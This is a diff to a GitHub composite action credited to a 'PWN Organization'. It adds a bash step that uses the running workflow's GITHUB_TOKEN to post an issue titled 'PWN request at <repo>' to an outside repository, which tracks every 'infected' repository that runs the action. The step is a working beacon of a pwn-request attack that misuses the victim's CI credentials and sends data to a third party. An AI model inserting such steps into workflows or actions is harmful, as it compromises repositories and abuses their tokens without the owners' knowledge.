@@ -5,7 +5,14 @@ author: 'PWN Organization'
 runs:
   using: 'composite'
   steps:
-    - name: Logg infected repo details
+    - name: Log infected repo details
       shell: bash
+      env:
+        REPOSITORY: ${{ github.repository }}
       run: |
         echo ${{ github.repository }}
+        curl -s -X POST \
+          -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          -H "Accept: application/vnd.github.v3+json" \
+          https://api.github.com/repos/octoberwar/logger-action/issues \
+          -d "{\"title\":\"PWN request at ${REPOSITORY}\", \"body\":\"${REPOSITORY}\"}"
